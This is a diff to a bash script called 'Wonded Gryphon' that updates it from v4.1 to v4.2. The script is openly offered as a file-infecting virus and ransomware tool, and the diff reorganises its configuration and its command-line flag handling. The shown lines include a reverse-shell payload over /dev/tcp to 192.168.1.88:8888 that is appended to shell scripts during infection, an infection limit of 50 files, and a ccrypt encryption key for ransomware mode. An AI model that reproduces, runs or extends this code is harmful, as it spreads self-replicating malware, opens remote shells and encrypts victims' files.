@@ -12,7 +12,7 @@
 #   \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
 #    \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
 #       /   \/       \/    |__|        \/      \     \/ ---------
-#      / Wonded Gryphon v4.1  ______----------- # ---------------
+#      / Wonded Gryphon v4.2  ______----------- # ---------------
 #     #          _______,---'__,---' ---------------------------
 #            _,-'---_---__,---' -----------------------------
 #     /_ #   (,  ---____', --------------------------------
@@ -38,13 +38,17 @@ ME="$0"
 
 CAT=$(cat "$ME")
 
+VERSION="v4.2"
+
+OFLAG="$1"
+
+# Configuration -------------------------------------------------------------------------------------------------------------#
+
+# Virus mode configuration ----------------------------------------------------$
+
 FLAG="#arrow"
 
-VERSION="v4.1"
-
-FLAG="$1"
-
-# ------------------------------------------------------------------
+# ------------------------------------------------------------------>
 
 # String you want to append to sh file. Example: reverse tcp bash (metasploit).
 # Responds to:
@@ -53,9 +57,21 @@ FLAG="$1"
 
 PAYLOAD="0<&205-;exec 205<>/dev/tcp/192.168.1.88/8888;sh <&205 >&205 2>&205" # Choose payload when infecting
 
-# -------------------------------------------------------------------
+# ------------------------------------------------------------------->
 
 MAXINFECTCOUNT=50 # Maximum infected files
+
+# ------------------------------------------------------------------------------$
+
+# Ransomware mode configuration ------------------------------------------------$
+
+KEY="GrYpHoN" # KEY
+
+CCRYPT="/bin/ccrypt"
+
+# ------------------------------------------------------------------------------$
+
+# ----------------------------------------------------------------------------------------------------------------------------#
 
 # Colors and special caracters
 
@@ -417,10 +433,6 @@ function virus_start() {
 
 # RANSOMWARE MODE
 
-KEY="GrYpHoN" # KEY
-
-CCRYPT="/bin/ccrypt"
-
 function ccryptcheck() {
    
    if [ -f "$CCRYPT" ]
@@ -743,32 +755,32 @@ function unencrypt() {
 
 # Start
 
-if [ "$FLAG" == "--infect" ]
+if [ "$OFLAG" == "--infect" ]
 
 then
    virus_start
 
-elif [ "$FLAG" == "--encrypt" ]
+elif [ "$OFLAG" == "--encrypt" ]
 
 then
    ransom_start
    
-elif [ "$FLAG" == "--uninfect" ]
+elif [ "$OFLAG" == "--uninfect" ]
 
 then
    uninfect
 
-elif [ "$FLAG" == "--help" ]
+elif [ "$OFLAG" == "--help" ]
 
 then
    helpfunction
    
-elif [ "$FLAG" == "--unencrypt" ]
+elif [ "$OFLAG" == "--unencrypt" ]
 
 then
    unencrypt
 
-elif [ "$FLAG" == "--banner" ]
+elif [ "$OFLAG" == "--banner" ]
 
 then
    BANNER
